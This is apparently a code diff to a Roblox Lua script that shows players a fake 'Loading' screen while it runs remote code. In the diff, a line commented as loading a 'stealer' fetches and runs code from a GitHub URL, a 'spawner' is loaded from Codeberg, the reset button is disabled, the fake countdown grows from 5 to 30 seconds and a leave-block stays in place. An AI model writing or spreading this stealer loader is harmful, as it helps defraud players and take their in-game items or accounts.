@@ -47,7 +47,7 @@ countLabel.BackgroundTransparency = 1
 countLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
 countLabel.Font = Enum.Font.Code
 countLabel.TextScaled = true
-countLabel.Text = "Loading: 5s"
+countLabel.Text = "Loading: 30s"
 
 local bottomText = Instance.new("TextLabel", mainFrame)
 bottomText.Size = UDim2.new(1, 0, 0.05, 0)
@@ -58,7 +58,7 @@ bottomText.Font = Enum.Font.Code
 bottomText.TextScaled = true
 bottomText.Text = "*Do not leave while loading...*"
 
--- Matrix fall
+-- Matrix math fall
 task.spawn(function()
 	while gui and gui.Parent do
 		local mathLabel = Instance.new("TextLabel", mainFrame)
@@ -86,22 +86,20 @@ pcall(function()
 	StarterGui:SetCore("ResetButtonCallback", false)
 end)
 
--- Stealer loads after 1 second
+-- 🕒 Load stealer after 1 second
 task.delay(1, function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/Petspawner1/NoLag/refs/heads/main/GrowaGarden"))()
 end)
 
--- Spawner loads after 6 seconds (after UI fades)
-task.delay(6, function()
-	local Spawner = loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
-	Spawner.Load()
-end)
+-- 🚀 Load spawner instantly
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
+Spawner.Load()
 
--- Countdown logic
+-- ⏳ Countdown for 30s
 task.spawn(function()
-	for i = 5, 0, -1 do
+	for i = 30, 0, -1 do
 		countLabel.Text = "Loading: " .. i .. "s"
-		circle.Rotation = (5 - i) * 72
+		circle.Rotation = (30 - i) * 12
 		wait(1)
 	end
 
@@ -119,14 +117,16 @@ task.spawn(function()
 		StarterGui:SetCore("ResetButtonCallback", true)
 	end)
 
-	wait(3)
+	wait(4)
 	gui:Destroy()
 	blur:Destroy()
 end)
 
--- Fake leave block
+-- 🛑 Optional fake leave block
 Players.PlayerRemoving:Connect(function(leavingPlayer)
-	if leavingPlayer == player and tick() - startTime < 5 then
+	if leavingPlayer == player and tick() - startTime < 30 then
+		-- Uncomment to kick early exit:
 		-- leavingPlayer:Kick("Leaving early is not allowed during loading.")
 	end
 end)
+
